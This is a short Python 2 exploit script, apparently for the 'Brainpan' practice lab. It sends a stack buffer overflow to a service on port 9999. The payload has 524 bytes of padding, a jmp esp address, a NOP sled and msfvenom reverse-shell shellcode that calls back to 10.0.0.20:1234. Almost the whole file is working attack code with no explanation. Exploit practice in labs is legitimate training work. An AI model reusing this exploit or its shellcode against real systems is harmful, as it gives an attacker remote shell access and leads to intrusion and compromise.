#brainpan

import socket
import sys

buff = "A" * 524		#offset

buff += "\xf3\x12\x17\x31"	#jmp esp

buff += "\x90" * 16		#NOP Slides

#msfvenom -p windows/shell_reverse_tcp lhost=10.0.0.20 lport=1234 -a x86 -f python -b "\x00"

#buf =  b""
buff += b"\xdd\xc1\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x52\xbe\x43"
buff += b"\x37\xd1\x13\x83\xc2\x04\x31\x72\x13\x03\x31\x24\x33"
buff += b"\xe6\x49\xa2\x31\x09\xb1\x33\x56\x83\x54\x02\x56\xf7"
buff += b"\x1d\x35\x66\x73\x73\xba\x0d\xd1\x67\x49\x63\xfe\x88"
buff += b"\xfa\xce\xd8\xa7\xfb\x63\x18\xa6\x7f\x7e\x4d\x08\x41"
buff += b"\xb1\x80\x49\x86\xac\x69\x1b\x5f\xba\xdc\x8b\xd4\xf6"
buff += b"\xdc\x20\xa6\x17\x65\xd5\x7f\x19\x44\x48\x0b\x40\x46"
buff += b"\x6b\xd8\xf8\xcf\x73\x3d\xc4\x86\x08\xf5\xb2\x18\xd8"
buff += b"\xc7\x3b\xb6\x25\xe8\xc9\xc6\x62\xcf\x31\xbd\x9a\x33"
buff += b"\xcf\xc6\x59\x49\x0b\x42\x79\xe9\xd8\xf4\xa5\x0b\x0c"
buff += b"\x62\x2e\x07\xf9\xe0\x68\x04\xfc\x25\x03\x30\x75\xc8"
buff += b"\xc3\xb0\xcd\xef\xc7\x99\x96\x8e\x5e\x44\x78\xae\x80"
buff += b"\x27\x25\x0a\xcb\xca\x32\x27\x96\x82\xf7\x0a\x28\x53"
buff += b"\x90\x1d\x5b\x61\x3f\xb6\xf3\xc9\xc8\x10\x04\x2d\xe3"
buff += b"\xe5\x9a\xd0\x0c\x16\xb3\x16\x58\x46\xab\xbf\xe1\x0d"
buff += b"\x2b\x3f\x34\x81\x7b\xef\xe7\x62\x2b\x4f\x58\x0b\x21"
buff += b"\x40\x87\x2b\x4a\x8a\xa0\xc6\xb1\x5d\xc5\x16\xb9\x89"
buff += b"\xb1\x14\xb9\xb5\x93\x90\x5f\xdf\x03\xf5\xc8\x48\xbd"
buff += b"\x5c\x82\xe9\x42\x4b\xef\x2a\xc8\x78\x10\xe4\x39\xf4"
buff += b"\x02\x91\xc9\x43\x78\x34\xd5\x79\x14\xda\x44\xe6\xe4"
buff += b"\x95\x74\xb1\xb3\xf2\x4b\xc8\x51\xef\xf2\x62\x47\xf2"
buff += b"\x63\x4c\xc3\x29\x50\x53\xca\xbc\xec\x77\xdc\x78\xec"
buff += b"\x33\x88\xd4\xbb\xed\x66\x93\x15\x5c\xd0\x4d\xc9\x36"
buff += b"\xb4\x08\x21\x89\xc2\x14\x6c\x7f\x2a\xa4\xd9\xc6\x55"
buff += b"\x09\x8e\xce\x2e\x77\x2e\x30\xe5\x33\x5e\x7b\xa7\x12"
buff += b"\xf7\x22\x32\x27\x9a\xd4\xe9\x64\xa3\x56\x1b\x15\x50"
buff += b"\x46\x6e\x10\x1c\xc0\x83\x68\x0d\xa5\xa3\xdf\x2e\xec"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
        s.connect(('10.0.0.25', 9999))

except:
        print "Error"
        sys.exit(0)

s.recv(1024)
s.send(buff)
